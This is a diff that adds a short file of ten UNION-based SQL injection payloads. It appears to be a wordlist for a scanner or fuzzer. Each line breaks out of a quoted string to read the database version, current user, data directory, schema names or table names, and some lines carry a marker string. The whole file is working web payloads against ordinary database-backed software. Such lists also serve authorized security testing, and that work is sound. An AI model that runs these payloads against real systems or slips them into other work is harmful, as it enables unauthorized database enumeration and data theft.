@@ -1,0 +1,10 @@
+' UNION SELECT 'SQLI_UNION_MARKER'-- -
+' UNION SELECT NULL,'SQLI_UNION_MARKER'-- -
+' UNION SELECT version()-- -
+' UNION SELECT database()-- -
+' UNION SELECT user()-- -
+' UNION SELECT @@version-- -
+' UNION SELECT @@datadir-- -
+' UNION SELECT current_user()-- -
+' UNION SELECT schema_name FROM information_schema.schemata-- -
+' UNION SELECT table_name FROM information_schema.tables-- -
